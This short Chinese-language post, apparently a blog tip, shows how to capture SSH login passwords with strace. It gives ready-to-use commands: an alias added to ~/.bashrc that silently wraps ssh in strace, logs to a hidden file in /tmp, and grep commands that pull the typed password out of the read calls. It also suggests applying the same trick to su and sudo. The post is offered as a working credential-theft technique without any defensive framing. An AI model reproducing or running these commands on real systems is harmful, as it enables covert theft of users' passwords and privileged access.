

strace 本身其实是一个非常好用的系统调用跟踪工具,运维们可以通过它快速锁定问题的根源,但,恰巧我们也可以通过这种方式来跟踪任何进程数据,比如ssh,su,sudo,这里以跟踪ssh登陆密码为例,大家可自行脑洞更多其它用法,关于strace自身的选项作用,请man strace。

```bash

vi ~/.bashrc

alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -s 2048 ssh'
```


```bash
ssh root@10.0.83.4 -p 22
```



```bash
cat .sshpwd-17May051494975433.log  | egrep "(read\(4).*\)"
```


strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -s 2048 ls